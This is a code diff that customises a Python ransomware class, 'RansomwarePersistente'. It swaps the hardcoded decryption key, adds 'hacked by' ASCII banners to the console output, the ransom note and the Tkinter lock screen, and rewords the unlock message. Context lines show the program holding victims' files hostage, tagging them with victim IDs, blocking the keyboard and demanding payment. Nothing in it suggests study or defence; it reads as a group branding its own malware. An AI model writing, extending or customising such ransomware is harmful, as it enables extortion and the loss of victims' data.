@@ -34,7 +34,7 @@ class RansomwarePersistente:
         self.encryption_count = 0
         
         # CLAVE FIJA DE CIFRADO - SOLO PARA EL DESARROLLADOR
-        self.password = "D3m0_F1x3d_K3y_2024!"  # Esta clave solo la ves tú
+        self.password = "Coyote_Expotel"  # Esta clave solo la ves tú
         self.victim_id = "VICTIM_" + ''.join(random.sample(string.ascii_uppercase + string.digits, 6))
         
         self.script_path = os.path.abspath(__file__)
@@ -50,12 +50,41 @@ class RansomwarePersistente:
     def show_banner(self):
         """Muestra el banner ASCII"""
         banner = """
- ██████╗ ██████╗ ███████╗██████╗ ████████╗██╗███╗   ██╗ ██████╗ 
-██╔═══██╗██╔══██╗██╔════╝██╔══██╗╚══██╔══╝██║████╗  ██║██╔════╝ 
-██║   ██║██████╔╝█████╗  ██████╔╝   ██║   ██║██╔██╗ ██║██║  ███╗
-██║   ██║██╔══██╗██╔══╝  ██╔══██╗   ██║   ██║██║╚██╗██║██║   ██║
-╚██████╔╝██║  ██║███████╗██║  ██║   ██║   ██║██║ ╚████║╚██████╔╝
- ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝╚═╝  ╚═══╝ ╚═════╝ 
+                )                      *     
+  *   )      ( /(    *   )     (     (  `    
+` )  /(   (  )\()) ` )  /((    )\    )\))(   
+ ( )(_))  )\((_)\   ( )(_))\((((_)( ((_)()\  
+(_(_())_ ((_)_((_) (_(_()|(_))\ _ )\(_()((_) 
+|_   _| | | \ \/ / |_   _| __(_)_\(_)  \/  |  
+  | | | |_| |>  <    | | | _| / _ \ | |\/| | 
+  |_|  \___//_/\_\   |_| |___/_/ \_\|_|  |_|    
+
+                a8888b.
+             d888888b.
+             8P"YP"Y88
+             8|o||o|88
+             8'    .88
+             8`._.' Y8.
+            d/      `8b.
+          .dP   .     Y8b.
+         d8:'   "   `::88b.
+        d8"           `Y88b
+       :8P     '       :888
+        8a.    :      _a88P
+      ._/"Yaa_ :    .| 88P|
+ jgs  \    YP"      `| 8P  `.
+ a:f  /     \._____.d|    .'
+      `--..__)888888P`._.'        
+            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢎⠱⠊⡱⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡠⠤⠒⠒⠒⠒⠤⢄⣑⠁⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⢀⡤⠒⠝⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠲⢄⡀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⢀⡴⠋⠀⠀⠀⠀⣀⠀⠀⠀⠀⠀⠀⢠⣢⠐⡄⠀⠉⠑⠒⠒⠒⣄
+⠀⠀⠀⣀⠴⠋⠀⠀⠀⡎⢀⣘⠿⠀⠀⢠⣀⢄⡦⠀⣛⣐⢸⠀⠀⠀⠀⠀⠀⢘
+⡠⠒⠉⠀⠀⠀⠀⠀⡰⢅⠣⠤⠘⠀⠀⠀⠀⠀⠀⢀⣀⣤⡋⠙⠢⢄⣀⣀⡠⠊
+⢇⠀⠀⠀⠀⠀⢀⠜⠁⠀⠉⡕⠒⠒⠒⠒⠒⠛⠉⠹⡄⣀⠘⡄⠀⠀⠀⠀⠀⠀
+⠀⠑⠂⠤⠔⠒⠁⠀⠀⡎⠱⡃⠀⠀⡄⠀⠄⠀⠀⠠⠟⠉⡷⠁⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⠤⠤⠴⣄⡸⠤⣄⠴⠤⠴⠄⠼⠀⠀⠀⠀⠀⠀⠀⠀
+
 ==================================================
         TU INFORMACION HA SIDO SECUESTRADA
 ==================================================
@@ -281,8 +310,18 @@ class RansomwarePersistente:
     def create_ransom_note(self):
         note = f"""
 ================================================================
-!!! SISTEMA BLOQUEADO !!!
+!!! Fuiste Hackeado Por !!!
 ================================================================
+
+                )                      *     
+  *   )      ( /(    *   )     (     (  `    
+` )  /(   (  )\()) ` )  /((    )\    )\))(   
+ ( )(_))  )\((_)\   ( )(_))\((((_)( ((_)()\  
+(_(_())_ ((_)_((_) (_(_()|(_))\ _ )\(_()((_) 
+|_   _| | | \ \/ / |_   _| __(_)_\(_)  \/  |  
+  | | | |_| |>  <    | | | _| / _ \ | |\/| | 
+  |_|  \___//_/\_\   |_| |___/_/ \_\|_|  |_|  
+
 TU INFORMACION HA SIDO SECUESTRADA
 
 INFORMACION PARA LA RECUPERACION:
@@ -368,6 +407,30 @@ que recibirá después del pago.
                 bg="black"
             )
             message_label.pack(pady=10)
+
+             # Banner "FUISTE HACKEADO POR"
+            hack_banner_text = """
+-------------------------------------------
+FUISTE HACKEADO POR      
+-------------------------------------------
+               )                      *     
+  *   )      ( /(    *   )     (     (  `    
+` )  /(   (  )\\()) ` )  /((    )\\    )\\))(   
+ ( )(_))  )\\((_)\\   ( )(_))\\((((_)( ((_)()\\  
+(_(_())_ ((_)_((_) (_(_()|(_))\\ _ )\\(_()((_) 
+|_   _| | | \\ \\/ / |_   _| __(_)_\\(_)  \\/  |  
+  | | | |_| |>  <    | | | _| / _ \\ | |\\/| | 
+  |_|  \\___//_/\\_\\   |_| |___/_/ \\_\\|_|  |_|
+"""
+            hack_banner = tk.Label(
+                main_frame,
+                text=hack_banner_text,
+                font=("Courier New", 10),
+                fg="#00ff00",
+                bg="black",
+                justify="center"
+            )
+            hack_banner.pack(pady=15)
             
             # Información
             info_text = f"""
@@ -443,7 +506,7 @@ Ingrese la clave de descifrado:
         """Verifica si la clave de descifrado es correcta"""
         entered_password = self.password_var.get()
         if entered_password == self.password:
-            messagebox.showinfo("ÉXITO", "Clave correcta! Iniciando descifrado...")
+            messagebox.showinfo("Esta ves tuviste suerte", "Clave correcta! Ejecuta el archivo de desiframiento, tu sistema el libre")
             root.destroy()
             self.window_open = False
             self.unblock_keyboard()
